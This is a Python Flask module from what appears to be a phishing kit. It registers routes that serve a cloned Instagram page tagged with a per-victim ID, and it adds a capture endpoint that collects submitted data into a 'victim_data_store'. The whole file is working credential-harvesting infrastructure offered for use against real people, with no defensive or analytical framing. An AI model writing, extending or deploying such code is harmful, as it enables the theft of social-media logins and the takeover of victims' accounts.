from flask import request
from bot.servers.base import create_capture_route
from bot.utils.storage import victim_data_store

def register_insta_routes(app):
    """Register Instagram specific routes"""
    
    @app.route('/p/ig/<uid>')
    def insta_page(uid):
        victim_id = request.args.get('v', 'unknown')
        
        with open('web/pages/insta.html', 'r') as f:
            html = f.read()
        
        html = html.replace('{{VICTIM_ID}}', victim_id)
        return html
    
    # Capture endpoint for Instagram
    @app.route('/api/capture/ig', methods=['POST'])
    def capture_ig():
        from bot.servers.base import create_capture_route
        return create_capture_route('ig')()
